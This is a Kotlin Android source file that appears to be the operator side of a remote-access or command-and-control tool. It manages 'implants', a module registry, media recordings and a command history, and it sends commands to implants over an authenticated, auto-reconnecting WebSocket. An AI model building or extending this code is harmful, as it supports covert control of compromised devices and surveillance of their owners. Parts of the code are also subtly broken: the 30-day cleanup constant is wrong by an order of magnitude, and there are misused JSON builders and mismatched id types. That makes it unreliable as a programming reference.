package com.shadow.operator.data

import android.content.Context
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.asLiveData
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.*
import kotlinx.coroutines.flow.combine
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.mapLatest
import kotlinx.coroutines.flow.onEach
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.encodeToString
import java.util.concurrent.ConcurrentHashMap

class Repository(
    private val dao: ImplantDao,
    private val historyDao: CommandHistoryDao,
    private val moduleDao: ModuleRegistryDao,
    private val mediaDao: MediaRecordingDao,
    private val configManager: ConfigManager,
    private val scope: CoroutineScope
) {
    // In-memory cache for real-time frame handling
    private val pendingCommands = ConcurrentHashMap<String, CompletableDeferred<String>>()
    private val activeSessions = ConcurrentHashMap<String, SessionState>()
    
    // Exposed state flows
    val allImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
    val onlineImplants: MutableStateFlow<List<ImplantEntity>> = MutableStateFlow(emptyList())
    val commandHistory: MutableStateFlow<List<CommandHistoryEntity>> = MutableStateFlow(emptyList())
    val moduleRegistry: MutableStateFlow<List<ModuleRegistryEntity>> = MutableStateFlow(emptyList())
    val connectionState: MutableStateFlow<ConnectionState> = MutableStateFlow(ConnectionState.DISCONNECTED)
    val currentLatency: MutableStateFlow<Long> = MutableStateFlow(-1)

    private var networkManager: NetworkManager? = null
    private var websocketJob: Job? = null

    init {
        observeDatabase()
    }

    private fun observeDatabase() {
        scope.launch { dao.getAll().collect { allImplants.value = it } }
        scope.launch { dao.getOnline().collect { onlineImplants.value = it } }
        scope.launch { moduleDao.getAll().collect { moduleRegistry.value = it } }
    }

    fun initializeNetwork(config: ClientConfig) {
        networkManager = NetworkManager(this, config)
        websocketJob = scope.launch { networkManager!!.connect() }
    }

    fun shutdown() {
        websocketJob?.cancel()
        scope.launch { networkManager?.disconnect() }
    }

    // --- High-level Operations ---

    suspend fun addOrUpdateImplant(implant: ImplantEntity) {
        dao.insert(implant)
    }

    suspend fun removeImplant(implantId: String) {
        dao.delete(implantId)
        historyDao.cleanupOld(System.currentTimeMillis() - 30_000_000_000L) // 30 days
    }

    suspend fun renameImplant(implantId: String, nickname: String?) {
        val implant = dao.getById(implantId) ?: return
        dao.insert(implant.copy(nickname = nickname))
    }

    suspend fun tagImplant(implantId: String, tags: List<String>) {
        val implant = dao.getById(implantId) ?: return
        dao.insert(implant.copy(tags = kotlinx.serialization.json.Json.encodeToString(tags)))
    }

    // --- Command Execution ---

    fun sendCommand(
        implantId: String,
        type: Command.CommandType,
        payload: String,
        sessionId: String? = null
    ): Deferred<String> {
        val command = Command(
            implantId = implantId,
            type = type,
            payload = payload
        )
        
        val completer = CompletableDeferred<String>()
        pendingCommands[command.id] = completer
        
        val frame = Frame(
            id = command.id,
            cmd = type.value,
            payload = payload,
            sessionId = sessionId
        )
        
        scope.launch { networkManager?.send(frame) }
        
        // Log to history
        scope.launch {
            historyDao.insert(CommandHistoryEntity(
                implantId = implantId,
                commandType = type.value,
                commandPayload = payload,
                status = "SENT"
            ))
        }
        
        return completer
    }

    fun handleIncomingFrame(frame: Frame) {
        when {
            frame.cmd == "result" || frame.cmd == "error" -> {
                pendingCommands.remove(frame.id)?.complete(frame.payload)
                scope.launch {
                    historyDao.updateStatus(
                        id = frame.id.toLongOrNull() ?: 0,
                        status = if (frame.cmd == "result") "COMPLETED" else "FAILED",
                        response = frame.payload,
                        duration = System.currentTimeMillis() - frame.ts
                    )
                }
            }
            frame.cmd == "heartbeat" -> {
                currentLatency.value = System.currentTimeMillis() - frame.ts
            }
            frame.cmd == "implant_status" -> {
                handleImplantStatus(frame.payload)
            }
            frame.cmd == "module_list" -> {
                handleModuleList(frame.payload)
            }
            frame.cmd == "media_chunk" -> {
                handleMediaChunk(frame)
            }
            else -> {
                // Route to active session
                activeSessions[frame.sessionId ?: "default"]?.channel?.trySend(frame)
            }
        }
    }

    private suspend fun handleImplantStatus(payload: String) {
        // Parse and update implant status
    }

    private suspend fun handleModuleList(payload: String) {
        // Update module registry
    }

    private fun handleMediaChunk(frame: Frame) {
        // Route media chunks to active media session
    }

    // --- Session Management ---

    fun createSession(implantId: String, type: String): SessionState {
        val session = SessionState(implantId, type)
        activeSessions["${implantId}_$type"] = session
        return session
    }

    fun closeSession(implantId: String, type: String) {
        activeSessions.remove("${implantId}_$type")?.channel?.close()
    }
}

enum class ConnectionState { DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING, ERROR }

data class SessionState(
    val implantId: String,
    val type: String,
    val channel: Channel<Frame> = Channel(100),
    val createdAt: Long = System.currentTimeMillis()
)

class NetworkManager(
    private val repository: Repository,
    private val config: ClientConfig
) {
    private val client = io.ktor.client.HttpClient(io.ktor.client.engine.android.Android)
    private var webSocketSession: io.ktor.client.plugins.websocket.WebSocketSession? = null
    private var reconnectAttempts = 0
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    suspend fun connect() {
        repository.connectionState.value = ConnectionState.CONNECTING
        
        val url = config.workerUrl
        client.webSocket(url) { session ->
            webSocketSession = session
            repository.connectionState.value = ConnectionState.CONNECTED
            reconnectAttempts = 0
            
            // Send initial auth frame
            val authFrame = Frame(
                id = java.util.UUID.randomUUID().toString(),
                cmd = "auth",
                payload = Json.encodeToString(jsonObject {
                    put("operator_pubkey", config.operatorPubKey)
                    put("protocol_version", 2)
                })
            )
            send(authFrame)
            
            // Incoming messages
            for (frame in session.incoming) {
                val textFrame = frame as? io.ktor.websocket.Frame.Text
                if (textFrame != null) {
                    val json = textFrame.readText()
                    val frameObj = Json.decodeFromString<Frame>(json)
                    repository.handleIncomingFrame(frameObj)
                }
            }
        }
        
        // Connection closed - handle reconnect
        scope.launch {
            if (config.autoReconnect && (config.maxReconnectAttempts == -1 || reconnectAttempts < config.maxReconnectAttempts)) {
                reconnectAttempts++
                repository.connectionState.value = ConnectionState.RECONNECTING
                delay(config.reconnectIntervalSec * 1000L)
                connect()
            } else {
                repository.connectionState.value = ConnectionState.DISCONNECTED
            }
        }
    }

    suspend fun disconnect() {
        webSocketSession?.close(io.ktor.websocket.CloseReason(io.ktor.websocket.CloseReason.Codes.NORMAL, "Client disconnect"))
        webSocketSession = null
        scope.coroutineContext.cancelChildren()
    }

    suspend fun send(frame: Frame) {
        val session = webSocketSession ?: return
        val json = Json.encodeToString(frame)
        session.send(io.ktor.websocket.Frame.Text(json))
    }
}